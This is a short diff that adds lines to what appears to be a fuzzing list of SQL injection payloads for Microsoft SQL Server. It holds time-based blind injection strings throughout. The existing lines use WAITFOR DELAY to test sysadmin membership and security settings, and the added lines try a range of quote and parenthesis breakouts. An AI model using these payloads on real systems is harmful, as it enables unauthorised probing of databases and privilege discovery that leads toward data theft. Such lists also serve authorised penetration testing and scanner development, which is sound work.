@@ -7,4 +7,17 @@ a
 '; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- 
 '; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --
 '; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --
+' WAITFOR DELAY '0:0:5'-- 
+1; WAITFOR DELAY '0:0:5'-- 
+' IF (1=1) WAITFOR DELAY '0:0:5'-- 
+' IF (1=2) WAITFOR DELAY '0:0:5'-- 
+1; WAITFOR DELAY '0:0:5'-- 
+1) WAITFOR DELAY '0:0:5'-- 
+1)); WAITFOR DELAY '0:0:5'-- 
+
+' IF (1=1) WAITFOR DELAY '0:0:5'-- 
+')) IF (1=1) WAITFOR DELAY '0:0:5'-- 
+',1,WAITFOR DELAY '0:0:5'--
+'),WAITFOR DELAY '0:0:5',('
+0, (SELECT 1); WAITFOR DELAY '0:0:5'--
 
